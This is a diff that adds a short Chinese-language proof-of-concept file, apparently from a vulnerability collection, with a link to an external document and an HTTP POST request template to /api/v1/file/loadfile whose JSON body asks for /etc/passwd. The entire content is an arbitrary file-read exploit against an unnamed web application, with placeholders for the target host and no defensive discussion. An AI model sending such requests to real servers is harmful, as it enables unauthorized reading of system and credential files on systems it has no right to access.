@@ -1,0 +1,8 @@
+详情可参考：https://zkunu7syvm.feishu.cn/docx/JmKgddUcMo4Rt2xLys4c4lN2nbc
+
+POST /api/v1/file/loadfile HTTP/1.1
+Host: [你的主机名或IP地址]
+Content-Type: application/json
+Content-Length: [请求体长度，以字节为单位]
+
+{"paht":"/etc/passwd"}
